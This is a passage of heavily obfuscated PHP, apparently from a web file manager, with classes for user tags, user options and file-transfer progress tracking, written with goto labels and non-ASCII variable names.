$Fê‹ƒÎéŠ‡ = array_remove_value(array_unique($Fê‹ƒÎéŠ‡), $DèË¤îóÍâ[470]); if (!$Fê‹ƒÎéŠ‡ || !$aÁ¼ªØæø) { return; } goto B¨Õã§Îã; AĞ¹£°ê‚: } private function _listAppendMeta(&$F™­øµîÇ, $Fà¿Éñó) { goto Bµ¦„ööàó; A®–ÃŸ»–º: foreach ($F™­øµîÇ as &$aŞªÃèø‡Ú) { $EÑ¥Æè¼ÉÚ = array(); if (isset($cğ½Ë‘õ§[$aŞªÃèø‡Ú[$F©©’•óÄ‚[1450]]])) { $EÑ¥Æè¼ÉÚ = $cğ½Ë‘õ§[$aŞªÃèø‡Ú[$F©©’•óÄ‚[1450]]]; } $aŞªÃèø‡Ú[$F©©’•óÄ‚[2581]] = array(); if (isset($EÑ¥Æè¼ÉÚ[$cÑî½Ÿ†¼])) { $aŞªÃèø‡Ú[$F©©’•óÄ‚[2581]] = $d†µ´™÷˜‹->getUserJobInfo($EÑ¥Æè¼ÉÚ[$cÑî½Ÿ†¼]); } } unset($aŞªÃèø‡Ú); goto eöÍê‘çÕâ; e®ôå‘ê: $dç½ç³˜† = array($F©©’•óÄ‚[1450] => array($F©©’•óÄ‚[7], $Fà¿Éñó)); $cğ½Ë‘õ§ = Model($F©©’•óÄ‚[2556])->where($dç½ç³˜†)->select(); $cğ½Ë‘õ§ = array_to_keyvalue_group($cğ½Ë‘õ§, $F©©’•óÄ‚[1450]); goto e³ÆŠ™ç¿á; Bµ¦„ööàó: $F©©’•óÄ‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $cÑî½Ÿ†¼ = UserJobModel::JOB_KEY; $däÂ¤ˆ­Ô = array($F©©’•óÄ‚[2559]); goto e®ôå‘ê; e³ÆŠ™ç¿á: foreach ($cğ½Ë‘õ§ as &$aŒºÕªë¸) { $A¥¾©‚¶» = array(); foreach ($aŒºÕªë¸ as $dÖ°ßõ®Ëˆ) { if (!in_array($dÖ°ßõ®Ëˆ[$F©©’•óÄ‚[89]], $däÂ¤ˆ­Ô)) { $A¥¾©‚¶»[$dÖ°ßõ®Ëˆ[$F©©’•óÄ‚[89]]] = $dÖ°ßõ®Ëˆ[$F©©’•óÄ‚[359]]; } } $aŒºÕªë¸ = $A¥¾©‚¶»; } unset($aŒºÕªë¸); $d†µ´™÷˜‹ = Model($F©©’•óÄ‚[2580]); goto A®–ÃŸ»–º; eöÍê‘çÕâ: } protected function groupUserAll($c¶‚…ØÄ˜È) { $D„Ş…¿åÒ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$c¶‚…ØÄ˜È) { return !1; } $F¼ø°Æ„ÌÑ = Model($D„Ş…¿åÒ[2200])->field($D„Ş…¿åÒ[1450])->where(array($D„Ş…¿åÒ[2121] => array($D„Ş…¿åÒ[7], $c¶‚…ØÄ˜È)))->select(); $F¼ø°Æ„ÌÑ = array_to_keyvalue($F¼ø°Æ„ÌÑ, $D„Ş…¿åÒ[33], $D„Ş…¿åÒ[1450]); return array_unique($F¼ø°Æ„ÌÑ); } public function userSearch($eŸ©‹™àõ, $A¹ñÉ‹¿Ëó = "\52") { return Model($_SERVER[¬ˆÚÂ”Éğä][479])->where($eŸ©‹™àõ)->field($A¹ñÉ‹¿Ëó)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\137\x6f\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($FÖ‘†ÇÓŠ) { $AšÁññ Ùš =& $_SERVER[¬ˆÚÂ”Éğä]; if (!defined($AšÁññ Ùš[427])) { define($AšÁññ Ùš[427], 0); } return "\x55\163\145\162\117\160\164\151\x6f\x6e\137{$FÖ‘†ÇÓŠ}\x5f" . USER_ID; } protected function filterWhere($a‹‹à¯…½) { $Eèî§¯†© =& $_SERVER[¬ˆÚÂ”Éğä]; if (!defined($Eèî§¯†©[427])) { define($Eèî§¯†©[427], 0); } $a‹‹à¯…½[$Eèî§¯†©[1450]] = USER_ID; return $a‹‹à¯…½; } public function cacheRemoveUser($cÕäïŠœÅŒ, $e˜î‘ÉëæÇ) { return Cache::remove("\x55\163\x65\162\117\160\164\x69\157\x6e\x5f{$cÕäïŠœÅŒ}\137" . $e˜î‘ÉëæÇ); } protected function optionDefault($dĞÈ‚ƒİÕ = '') { $cåÕ¼ØÎÜ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($dĞÈ‚ƒİÕ == $cåÕ¼ØÎÜ[33]) { return $GLOBALS[$cåÕ¼ØÎÜ[6]][$cåÕ¼ØÎÜ[2582]]; } if ($dĞÈ‚ƒİÕ == $cåÕ¼ØÎÜ[2583]) { return $GLOBALS[$cåÕ¼ØÎÜ[6]][$cåÕ¼ØÎÜ[2584]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\x74\141\x67\x4c\x69\x73\164"; public $modelType = "\125\163\145\x72\117\x70\x74\151\x6f\x6e"; public $field = array("\x6e\x61\155\x65", "\163\x74\171\x6c\x65", "\x73\157\162\164"); public function listData($E—Û†æÌ© = false, $B†»Šœ´İ° = "\163\x6f\x72\x74", $bàœËåŠÑ™ = false) { return parent::listData($E—Û†æÌ©, $B†»Šœ´İ°, $bàœËåŠÑ™); } public function remove($DÛğí³æ²¦) { return parent::remove($DÛğí³æ²¦); } public function add($Fö®±†šÉ, $E¥ÕŒçÄÊ = "\x6c\141\x62\x65\154\x2d\x67\x72\x65\171\55\156\x6f\162\x6d\x61\x6c") { $eø°×÷©”¬ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->findByName($Fö®±†šÉ)) { return !1; } $B¹±ÜğÒ‡ = array($eø°×÷©”¬[386] => $Fö®±†šÉ, $eø°×÷©”¬[437] => $E¥ÕŒçÄÊ, $eø°×÷©”¬[2125] => $this->getSort($eø°×÷©”¬[246]) + 1); return parent::insert($B¹±ÜğÒ‡); } public function update($a«†øåÑó™, $DÏÉ‚°Şƒ•) { $BÉåõÕßˆ =& $_SERVER[¬ˆÚÂ”Éğä]; $Eä‰Ô°…è = $this->listData($a«†øåÑó™); $f„ˆ§„àÓŠ = $this->findByName($DÏÉ‚°Şƒ•[$BÉåõÕßˆ[28]]); if (!$Eä‰Ô°…è || $f„ˆ§„àÓŠ && $f„ˆ§„àÓŠ[$BÉåõÕßˆ[367]] != $Eä‰Ô°…è[$BÉåõÕßˆ[367]]) { return !1; } return parent::update($a«†øåÑó™, $DÏÉ‚°Şƒ•); } public function moveTop($f·ğäã‘¯¦) { $aµĞİ±‡Ş´ =& $_SERVER[¬ˆÚÂ”Éğä]; $FÆ¬ÔÒÀ½ã = parent::listData(); $aÛçÑ¾—À = $this->getSort($aµĞİ±‡Ş´[245]); foreach ($FÆ¬ÔÒÀ½ã as &$DÂ©Ûò¹Ù¸) { if ($DÂ©Ûò¹Ù¸[$aµĞİ±‡Ş´[367]] == $f·ğäã‘¯¦) { $DÂ©Ûò¹Ù¸[$aµĞİ±‡Ş´[2143]] = $aÛçÑ¾—À; continue; } $DÂ©Ûò¹Ù¸[$aµĞİ±‡Ş´[2143]] += 1; } unset($DÂ©Ûò¹Ù¸); return parent::resetData($FÆ¬ÔÒÀ½ã); } public function moveBottom($aœ‹á“Í·ï) { $E¨Ô§‰À¼‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $C›òÏŠÑ³÷ = $this->getSort($E¨Ô§‰À¼‚[246]) + 1; return parent::update($aœ‹á“Í·ï, array($E¨Ô§‰À¼‚[2143] => $C›òÏŠÑ³÷)); } public function resetSort($bí…‚Âˆ¸) { goto b¸¿ƒ¡Øå¯; b¸¿ƒ¡Øå¯: $E”ÕŒÏàŞœ =& $_SERVER[¬ˆÚÂ”Éğä]; $c­†›˜ñ®Á = array(); $bí…‚Âˆ¸ = is_array($bí…‚Âˆ¸) ? $bí…‚Âˆ¸ : array(); goto EêŸ£èéÒ—; dé›½Ëäµ: unset($C¨çŞ†Ö“³); return parent::resetData($aõí„ÆÁ˜¥); goto aÔ¾Á„òğ™; EêŸ£èéÒ—: for ($bêìÓ®”²Ã = 0; $bêìÓ®”²Ã < count($bí…‚Âˆ¸); $bêìÓ®”²Ã++) { $c­†›˜ñ®Á[$bí…‚Âˆ¸[$bêìÓ®”²Ã] . $E”ÕŒÏàŞœ[33]] = $bêìÓ®”²Ã + 1; } $aõí„ÆÁ˜¥ = parent::listData(); foreach ($aõí„ÆÁ˜¥ as &$C¨çŞ†Ö“³) { $bÇÙŞƒÒè‘ = $c­†›˜ñ®Á[$C¨çŞ†Ö“³[$E”ÕŒÏàŞœ[367]]]; $C¨çŞ†Ö“³[$E”ÕŒÏàŞœ[2143]] = $bÇÙŞƒÒè‘ ? $bÇÙŞƒÒè‘ : $C¨çŞ†Ö“³[$E”ÕŒÏàŞœ[2143]]; } goto dé›½Ëäµ; aÔ¾Á„òğ™: } private function getSort($A¸İ¼´¥ùÆ) { $DŠ•¨ƒâğ =& $_SERVER[¬ˆÚÂ”Éğä]; $b·Ä˜‡Ô­ = parent::listData(); $aã¥èâ¬¿Ü = array_to_keyvalue($b·Ä˜‡Ô­, $DŠ•¨ƒâğ[33], $DŠ•¨ƒâğ[2143]); if (!$aã¥èâ¬¿Ü) { $aã¥èâ¬¿Ü = array(0); } $CË®…Â“È‘ = $A¸İ¼´¥ùÆ == $DŠ•¨ƒâğ[246] ? max($aã¥èâ¬¿Ü) : min($aã¥èâ¬¿Ü); return intval($CË®…Â“È‘); } } goto a§œòÔÓ¼Ú; Bí½§¥…š½: class TaskFileTransfer extends Task { protected function startAfter() { goto AÜ«‹‰íÛ±; aìµÂ‡á´¥: Hook::bind($b·¦®ó°Û[1474], array($this, $b·¦®ó°Û[1475])); Hook::bind($b·¦®ó°Û[1476], array($this, $b·¦®ó°Û[1477])); Hook::bind($b·¦®ó°Û[1478], array($this, $b·¦®ó°Û[1479])); goto bÃ…Ã’´ï; b°òåíÛƒ–: Hook::bind($b·¦®ó°Û[1487], array($this, $b·¦®ó°Û[1488])); Hook::bind($b·¦®ó°Û[1489], array($this, $b·¦®ó°Û[1490])); Hook::bind($b·¦®ó°Û[1491], array($this, $b·¦®ó°Û[1492])); goto dçš„Ï–¦·; C¨ÅïÍ¾ƒ¿: Hook::bind($b·¦®ó°Û[513], array($this, $b·¦®ó°Û[1483])); Hook::bind($b·¦®ó°Û[515], array($this, $b·¦®ó°Û[1483])); Hook::bind($b·¦®ó°Û[517], array($this, $b·¦®ó°Û[1483])); goto FêÍÉèƒ‚İ; bÃ…Ã’´ï: Hook::bind($b·¦®ó°Û[541], array($this, $b·¦®ó°Û[1480])); Hook::bind($b·¦®ó°Û[542], array($this, $b·¦®ó°Û[1481])); Hook::bind($b·¦®ó°Û[544], array($this, $b·¦®ó°Û[1482])); goto eÈÁŠœáç; AÜ«‹‰íÛ±: $b·¦®ó°Û =& $_SERVER[¬ˆÚÂ”Éğä]; $a¿Ö—÷²˜ =& $this->task; $this->sourceCopyFolder = !1; goto aìµÂ‡á´¥; FêÍÉèƒ‚İ: Hook::bind($b·¦®ó°Û[1484], array($this, $b·¦®ó°Û[1485])); Hook::bind($b·¦®ó°Û[534], array($this, $b·¦®ó°Û[1486])); $this->sourceModelCopyFlag = !1; goto b°òåíÛƒ–; eÈÁŠœáç: Hook::bind($b·¦®ó°Û[545], array($this, $b·¦®ó°Û[1482])); Hook::bind($b·¦®ó°Û[511], array($this, $b·¦®ó°Û[1483])); Hook::bind($b·¦®ó°Û[508], array($this, $b·¦®ó°Û[1483])); goto C¨ÅïÍ¾ƒ¿; Cªœ—•¨Ø: $a¿Ö—÷²˜[$b·¦®ó°Û[1499]] = 0; $a¿Ö—÷²˜[$b·¦®ó°Û[1500]] = 0; if (!$a¿Ö—÷²˜[$b·¦®ó°Û[1356]]) { $a¿Ö—÷²˜[$b·¦®ó°Û[1356]] = LNG($b·¦®ó°Û[1501]); } goto C–Ü¬ã×‡…; b ›Êïó‘: $a¿Ö—÷²˜[$b·¦®ó°Û[991]] = $b·¦®ó°Û[33]; $a¿Ö—÷²˜[$b·¦®ó°Û[1497]] = $b·¦®ó°Û[33]; $a¿Ö—÷²˜[$b·¦®ó°Û[1498]] = 0; goto Cªœ—•¨Ø; dçš„Ï–¦·: $a¿Ö—÷²˜[$b·¦®ó°Û[1493]] = LNG($b·¦®ó°Û[1494]); $a¿Ö—÷²˜[$b·¦®ó°Û[1495]] = 0; $a¿Ö—÷²˜[$b·¦®ó°Û[1496]] = 0; goto b ›Êïó‘; C–Ü¬ã×‡…: } protected function endAfter() { goto BÄÜá™Éœµ; Dˆ¢Äé‰À: Hook::unbind($CÑƒñ› ›¸[517], array($this, $CÑƒñ› ›¸[1483])); Hook::unbind($CÑƒñ› ›¸[1484], array($this, $CÑƒñ› ›¸[1485])); Hook::unbind($CÑƒñ› ›¸[534], array($this, $CÑƒñ› ›¸[1486])); goto b´è¶¬ã¡; BÄÜá™Éœµ: $CÑƒñ› ›¸ =& $_SERVER[¬ˆÚÂ”Éğä]; Hook::unbind($CÑƒñ› ›¸[1474], array($this, $CÑƒñ› ›¸[1475])); Hook::unbind($CÑƒñ› ›¸[1476], array($this, $CÑƒñ› ›¸[1477])); goto bÜµøğ; b´è¶¬ã¡: Hook::unbind($CÑƒñ› ›¸[1487], array($this, $CÑƒñ› ›¸[1488])); Hook::unbind($CÑƒñ› ›¸[1489], array($this, $CÑƒñ› ›¸[1490])); Hook::unbind($CÑƒñ› ›¸[1491], array($this, $CÑƒñ› ›¸[1492])); goto CÃˆí–¶†Ü; bÜµøğ: Hook::unbind($CÑƒñ› ›¸[1478], array($this, $CÑƒñ› ›¸[1479])); Hook::unbind($CÑƒñ› ›¸[541], array($this, $CÑƒñ› ›¸[1480])); Hook::unbind($CÑƒñ› ›¸[542], array($this, $CÑƒñ› ›¸[1481])); goto dË²Á«Á¼»; eËœ“Úˆİ: Hook::unbind($CÑƒñ› ›¸[508], array($this, $CÑƒñ› ›¸[1483])); Hook::unbind($CÑƒñ› ›¸[513], array($this, $CÑƒñ› ›¸[1483])); Hook::unbind($CÑƒñ› ›¸[515], array($this, $CÑƒñ› ›¸[1483])); goto Dˆ¢Äé‰À; dË²Á«Á¼»: Hook::unbind($CÑƒñ› ›¸[544], array($this, $CÑƒñ› ›¸[1482])); Hook::unbind($CÑƒñ› ›¸[545], array($this, $CÑƒñ› ›¸[1482])); Hook::unbind($CÑƒñ› ›¸[511], array($this, $CÑƒñ› ›¸[1483])); goto eËœ“Úˆİ; CÃˆí–¶†Ü: } public function copyMoveStart($BĞÖ†­³ä, $eÍì¸¼´„÷, $A½—¿¥‰—, $Bçƒ¤»‡íĞ) { goto a»Ì‡ï—ÆÈ; c´×ë¦è¤°: if (substr($eÍì¸¼´„÷, 0, strlen($cÚ¸áà˜µË)) == $cÚ¸áà˜µË) { return; } if (substr($Bçƒ¤»‡íĞ, 0, strlen($cÚ¸áà˜µË)) == $cÚ¸áà˜µË) { return; } $CŸÅ¿ÔÒ =& $this->task; goto b´Ùºó¼ï²; a»Ì‡ï—ÆÈ: $C“åŞÅ•­† =& $_SERVER[¬ˆÚÂ”Éğä]; self::log($C“åŞÅ•­†[1502] . $eÍì¸¼´„÷ . $C“åŞÅ•­†[66] . $Bçƒ¤»‡íĞ); $cÚ¸áà˜µË = rtrim(TEMP_FILES, $C“åŞÅ•­†[8]); goto c´×ë¦è¤°; b´Ùºó¼ï²: $CŸÅ¿ÔÒ[$C“åŞÅ•­†[1503]] = KodIO::transferType($BĞÖ†­³ä, $A½—¿¥‰—); $this->update(); goto BâÍñ‘¶«Æ; BâÍñ‘¶«Æ: } public function updateAfter() { goto fÔÂ¡à«•; dİÑÑ’¯º„: $CÛèÉçîç[$DÁ«¶ˆ±„[1451]] = $CÛèÉçîç[$DÁ«¶ˆ±„[1500]] / $CÛèÉçîç[$DÁ«¶ˆ±„[706]]; if ($CÛèÉçîç[$DÁ«¶ˆ±„[1451]] > 0) { $D‰¬¯§‘Òó = timeFloat() - $CÛèÉçîç[$DÁ«¶ˆ±„[1453]] - $CÛèÉçîç[$DÁ«¶ˆ±„[1456]]; $CÛèÉçîç[$DÁ«¶ˆ±„[1457]] = $D‰¬¯§‘Òó * (1 - $CÛèÉçîç[$DÁ«¶ˆ±„[1451]]) / $CÛèÉçîç[$DÁ«¶ˆ±„[1451]]; } goto E©­ßß±ßŞ; e×‹ö­ÖÔÀ: if ($this->sourceModelCopyFlag) { return; } if ($CÛèÉçîç[$DÁ«¶ˆ±„[1503]] == $DÁ«¶ˆ±„[1107]) { return; } if ($CÛèÉçîç[$DÁ«¶ˆ±„[1503]] == $DÁ«¶ˆ±„[1053] || $CÛèÉçîç[$DÁ«¶ˆ±„[1503]] == $DÁ«¶ˆ±„[103]) { if ($CÛèÉçîç[$DÁ«¶ˆ±„[1497]]) { $CÛèÉçîç[$DÁ«¶ˆ±„[1500]] = $CÛèÉçîç[$DÁ«¶ˆ±„[1499]] + $CÛèÉçîç[$DÁ«¶ˆ±„[1496]]; } } else { if ($CÛèÉçîç[$DÁ«¶ˆ±„[1503]] == $DÁ«¶ˆ±„[1108]) { if ($CÛèÉçîç[$DÁ«¶ˆ±„[1497]] == $DÁ«¶ˆ±„[1053]) { $CÛèÉçîç[$DÁ«¶ˆ±„[1500]] = $CÛèÉçîç[$DÁ«¶ˆ±„[1499]] + $CÛèÉçîç[$DÁ«¶ˆ±„[1496]] * 0.5; } else { if ($CÛèÉçîç[$DÁ«¶ˆ±„[1497]] == $DÁ«¶ˆ±„[103]) { $CÛèÉçîç[$DÁ«¶ˆ±„[1500]] = $CÛèÉçîç[$DÁ«¶ˆ±„[1499]] + $CÛèÉçîç[$DÁ«¶ˆ±„[1495]] * 0.5 + $CÛèÉçîç[$DÁ«¶ˆ±„[1496]] * 0.5; } } } } goto dİÑÑ’¯º„; fÔÂ¡à«•: $DÁ«¶ˆ±„ =& $_SERVER[¬ˆÚÂ”Éğä]; $CÛèÉçîç =& $this->task; if (!$CÛèÉçîç[$DÁ«¶ˆ±„[706]]) { return; } goto e×‹ö­ÖÔÀ; E©­ßß±ßŞ: } public function addPath($FëÉøÊ—) { goto d‰¥”³—«; bÉ¨–›£‰Ğ: if ($aº¡Ÿ›¡Œµ[$Eğ¤ì¾ß‡ê[29]] == $Eğ¤ì¾ß‡ê[167]) { $Dˆ•®íÙ²[$Eğ¤ì¾ß‡ê[989]] += 1; } else { $Dˆ•®íÙ²[$Eğ¤ì¾ß‡ê[989]] += $aº¡Ÿ›¡Œµ[$Eğ¤ì¾ß‡ê[80]][$Eğ¤ì¾ß‡ê[78]]; if ($aº¡Ÿ›¡Œµ[$Eğ¤ì¾ß‡ê[369]]) { $Dˆ•®íÙ²[$Eğ¤ì¾ß‡ê[989]] += $aº¡Ÿ›¡Œµ[$Eğ¤ì¾ß‡ê[80]][$Eğ¤ì¾ß‡ê[79]] + 1; } } $Dˆ•®íÙ²[$Eğ¤ì¾ß‡ê[706]] += $aº¡Ÿ›¡Œµ[$Eğ¤ì¾ß‡ê[77]]; $this->update(); goto bÒìƒŠœÍ­; C°¼£’Î½¤: $aº¡Ÿ›¡Œµ = IO::infoWithChildren($FëÉøÊ—); $c§õÓÙ»áí = $Dˆ•®íÙ²[$Eğ¤ì¾ß‡ê[1504]] ? $Dˆ•®íÙ²[$Eğ¤ì¾ß‡ê[1504]][$Eğ¤ì¾ß‡ê[1505]] : 0; $Dˆ•®íÙ²[$Eğ¤ì¾ß‡ê[1504]] = array($Eğ¤ì¾ß‡ê[1505] => $c§õÓÙ»áí + 1, $Eğ¤ì¾ß‡ê[386] => $aº¡Ÿ›¡Œµ[$Eğ¤ì¾ß‡ê[28]], $Eğ¤ì¾ß‡ê[75] => $aº¡Ÿ›¡Œµ[$Eğ¤ì¾ß‡ê[75]], $Eğ¤ì¾ß‡ê[468] => $aº¡Ÿ›¡Œµ[$Eğ¤ì¾ß‡ê[468]] ? $aº¡Ÿ›¡Œµ[$Eğ¤ì¾ß‡ê[468]] : $aº¡Ÿ›¡Œµ[$Eğ¤ì¾ß‡ê[75]]); goto bÉ¨–›£‰Ğ; d‰¥”³—«: $Eğ¤ì¾ß‡ê =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$FëÉøÊ—) { return; } $Dˆ•®íÙ² =& $this->task; goto C°¼£’Î½¤; bÒìƒŠœÍ­: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($F†¹˜ÍöØ) { $c¾ˆÍÎí¡£ =& $_SERVER[¬ˆÚÂ”Éğä]; $DƒÁºŸøÒ­ =& $this->task; $DƒÁºŸøÒ­[$c¾ˆÍÎí¡£[1493]] = $F†¹˜ÍöØ[$c¾ˆÍÎí¡£[28]]; $DƒÁºŸøÒ­[$c¾ˆÍÎí¡£[991]] = $F†¹˜ÍöØ[$c¾ˆÍÎí¡£[28]]; $this->update(); } public function copyFileStart($D²•äÈç˜Î, $c‰’À´È¥É, $aš‹î¾ˆ½ñ, $A›§î¬Æ, $bÓö‘³Ñ¦°, $C×Ü¾­¿£) { goto b•ùÉ‡Ù™à; cœŠ¦¶Å²®: $GLOBALS[$F¡‡¸¤»ã“[1507]] = $bÓö‘³Ñ¦°; $GLOBALS[$F¡‡¸¤»ã“[1506]] = $C×Ü¾­¿£; $eÕå©¸ãêï =& $this->task; goto aˆØ”ÃĞùœ; b•ùÉ‡Ù™à: $F¡‡¸¤»ã“ =& $_SERVER[¬ˆÚÂ”Éğä]; $añ´—°§ = $bÓö‘³Ñ¦°; if ($añ´—°§ == $GLOBALS[$F¡‡¸¤»ã“[1506]]) { $añ´—°§ = $GLOBALS[$F¡‡¸¤»ã“[1507]]; } goto cœŠ¦¶Å²®; aˆØ”ÃĞùœ: $eÕå©¸ãêï[$F¡‡¸¤»ã“[1493]] = $añ´—°§; $eÕå©¸ãêï[$F¡‡¸¤»ã“[1495]] = (int) $D²•äÈç˜Î->size($c‰’À´È¥É); $eÕå©¸ãêï[$F¡‡¸¤»ã“[1496]] = 0; goto Dë¿›Ó²÷Ğ; e‚Ñè§İ: $this->update(); goto aŸÈÒ¯ÇÎ; Dë¿›Ó²÷Ğ: $eÕå©¸ãêï[$F¡‡¸¤»ã“[991]] = $F¡‡¸¤»ã“[33]; $eÕå©¸ãêï[$F¡‡¸¤»ã“[1497]] = $F¡‡¸¤»ã“[33]; $eÕå©¸ãêï[$F¡‡¸¤»ã“[1498]] = 0; goto e‚Ñè§İ; aŸÈÒ¯ÇÎ: } public function copyFileEnd($c†ê×¸ ÷¦, $eñ æ­öÜ, $C×Ò¿£¾Ú, $Dõ—‰÷òæ», $fŞğ‡ƒŒù, $F‹è›ñ¹ùó) { $B–ÀŞ“ÊèÓ =& $_SERVER[¬ˆÚÂ”Éğä]; $a‹Á³ÍÙ„ =& $this->task; $a‹Á³ÍÙ„[$B–ÀŞ“ÊèÓ[1496]] = $a‹Á³ÍÙ„[$B–ÀŞ“ÊèÓ[1495]]; $a‹Á³ÍÙ„[$B–ÀŞ“ÊèÓ[1497]] = $B–ÀŞ“ÊèÓ[33]; if ($fŞğ‡ƒŒù == $a‹Á³ÍÙ„[$B–ÀŞ“ÊèÓ[1493]]) { $a‹Á³ÍÙ„[$B–ÀŞ“ÊèÓ[1499]] += $a‹Á³ÍÙ„[$B–ÀŞ“ÊèÓ[1495]]; $a‹Á³ÍÙ„[$B–ÀŞ“ÊèÓ[1500]] = $a‹Á³ÍÙ„[$B–ÀŞ“ÊèÓ[1499]]; $this->update(1); } else { $this->update(); $a‹Á³ÍÙ„[$B–ÀŞ“ÊèÓ[1496]] = 0; } self::log($B–ÀŞ“ÊèÓ[1508] . $eñ æ­öÜ . $B–ÀŞ“ÊèÓ[66] . $Dõ—‰÷òæ» . $B–ÀŞ“ÊèÓ[217] . $fŞğ‡ƒŒù . $B–ÀŞ“ÊèÓ[1509] . $a‹Á³ÍÙ„[$B–ÀŞ“ÊèÓ[1493]]); } public function updateFileEnd($aéƒ—©ÓÌğ, $EÙÛ‹×Ëƒ) { goto aÃ¶ø¶”öÒ; aÃ¶ø¶”öÒ: $dÛŠß§‘¤µ =& $_SERVER[¬ˆÚÂ”Éğä]; $dë‡›´‚è =& $this->task; $dë‡›´‚è[$dÛŠß§‘¤µ[1493]] = $aéƒ—©ÓÌğ; goto C±ôëÙƒĞ; C±ôëÙƒĞ: $dë‡›´‚è[$dÛŠß§‘¤µ[1495]] = $EÙÛ‹×Ëƒ; $dë‡›´‚è[$dÛŠß§‘¤µ[1499]] += $EÙÛ‹×Ëƒ; $dë‡›´‚è[$dÛŠß§‘¤µ[1500]] = $dë‡›´‚è[$dÛŠß§‘¤µ[1499]]; goto dÆÆ—í„£; dÆÆ—í„£: $this->update(1); self::log($dÛŠß§‘¤µ[1510] . $aéƒ—©ÓÌğ); goto b‡Ó­õŸ©; b‡Ó­õŸ©: } public function sourceModelCopy($E†óÚ„‚èÑ) { goto E²Ş¾å¢˜; B¯ØÜ„š²Ç: switch ($D–Ñ»İ¾¸) { case $F™ê´Ş‹Û†[509]: $b¼‹¼±ËÛÇ = 1; break; case $F™ê´Ş‹Û†[512]: $FîËÍ‰á‹[$F™ê´Ş‹Û†[1493]] = $AœÊí‚‡„[$F™ê´Ş‹Û†[28]]; break; case $F™ê´Ş‹Û†[514]: $b¼‹¼±ËÛÇ = intval($E†óÚ„‚èÑ[$F™ê´Ş‹Û†[363]] * 0.4); break; case $F™ê´Ş‹Û†[516]: $b¼‹¼±ËÛÇ = intval($E†óÚ„‚èÑ[$F™ê´Ş‹Û†[363]] * 0.2); break; case $F™ê´Ş‹Û†[518]: $b¼‹¼±ËÛÇ = intval($E†óÚ„‚èÑ[$F™ê´Ş‹Û†[363]] * 0.4); break; } $this->update($b¼‹¼±ËÛÇ); $this->sourceModelCopyFlag = !1; goto a‰ñ®ÌÁİ; E²Ş¾å¢˜: $F™ê´Ş‹Û† =& $_SERVER[¬ˆÚÂ”Éğä]; $D–Ñ»İ¾¸ = $E†óÚ„‚èÑ[0]; $AœÊí‚‡„ = $E†óÚ„‚èÑ[1]; goto e¢Ûˆ«ÓŒÍ; e¢Ûˆ«ÓŒÍ: $FîËÍ‰á‹ =& $this->task; $this->sourceModelCopyFlag = !0; $b¼‹¼±ËÛÇ = 0; goto B¯ØÜ„š²Ç; a‰ñ®ÌÁİ: } public function sourceRemove($BäÎºÛ¼³, $FÈ©Å¯âß) { $DĞÎÔÛ‚’â =& $_SERVER[¬ˆÚÂ”Éğä]; $this->sourceModelCopyFlag = !0; $c¶Ø°æœÉç = 1; if (isset($BäÎºÛ¼³[$DĞÎÔÛ‚’â[80]])) { $c¶Ø°æœÉç = $BäÎºÛ¼³[$DĞÎÔÛ‚’â[80]][$DĞÎÔÛ‚’â[78]] + $BäÎºÛ¼³[$DĞÎÔÛ‚’â[80]][$DĞÎÔÛ‚’â[79]] + 1; } $this->update($c¶Ø°æœÉç); $this->sourceModelCopyFlag = !1; } public function sourceMove($e“ó¹ªÑÌ†) { $this->sourceRemove($e“ó¹ªÑÌ†, !1); } public function curlProgress($AÛÇîÄ«À, $f ÖĞöäÆˆ, $Cí­‚ÕÑ¡½, $EÑ®„ãø‰, $Cæ’¾„ï¾µ) { $Dêâæ‡Ê¦Ù =& $_SERVER[¬ˆÚÂ”Éğä]; $d·¦£Ã†öù =& $this->task; if ($Cæ’¾„ï¾µ > 0) { $d·¦£Ã†öù[$Dêâæ‡Ê¦Ù[991]] = $Dêâæ‡Ê¦Ù[1511]; $d·¦£Ã†öù[$Dêâæ‡Ê¦Ù[1497]] = $Dêâæ‡Ê¦Ù[103]; if ($d·¦£Ã†öù[$Dêâæ‡Ê¦Ù[1495]] == $EÑ®„ãø‰ || $EÑ®„ãø‰ > 1024 * 1024) { $d·¦£Ã†öù[$Dêâæ‡Ê¦Ù[1496]] = $Cæ’¾„ï¾µ; } if ($d·¦£Ã†öù[$Dêâæ‡Ê¦Ù[1498]]) { $d·¦£Ã†öù[$Dêâæ‡Ê¦Ù[1496]] = $Cæ’¾„ï¾µ + $d·¦£Ã†öù[$Dêâæ‡Ê¦Ù[1498]]; } } else { if ($Cí­‚ÕÑ¡½ > 0) { if ($d·¦£Ã†öù[$Dêâæ‡Ê¦Ù[1495]] == $f ÖĞöäÆˆ) { $d·¦£Ã†öù[$Dêâæ‡Ê¦Ù[1496]] = $Cí­‚ÕÑ¡½; $d·¦£Ã†öù[$Dêâæ‡Ê¦Ù[991]] = $Dêâæ‡Ê¦Ù[1512]; $d·¦£Ã†öù[$Dêâæ‡Ê¦Ù[1497]] = $Dêâæ‡Ê¦Ù[1053]; } } } $this->update(); } public function curlProgressStart($dÙ†‡¹ëÒ‡) { } public function curlProgressEnd($E‹«æ¦¯º) { $Fùß–É—Ñ =& $_SERVER[¬ˆÚÂ”Éğä]; $eƒ Õ”Ò¹ =& $this->task; $f¾î¿öÑ²º = curl_getinfo($E‹«æ¦¯º); $Dô‡ÂÜßÒ = $f¾î¿öÑ²º[$Fùß–É—Ñ[1513]]; if ($eƒ Õ”Ò¹[$Fùß–É—Ñ[1497]] == $Fùß–É—Ñ[103] && $Dô‡ÂÜßÒ) { $eƒ Õ”Ò¹[$Fùß–É—Ñ[1498]] += $Dô‡ÂÜßÒ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $FÄ®’ò¢³ =& $_SERVER[¬ˆÚÂ”Éğä]; $aù­–Ğ¼Ã =& $this->task; $aù­–Ğ¼Ã[$FÄ®’ò¢³[1514]] = 1; Hook::bind($FÄ®’ò¢³[1487], array($this, $FÄ®’ò¢³[1515])); Hook::bind($FÄ®’ò¢³[1489], array($this, 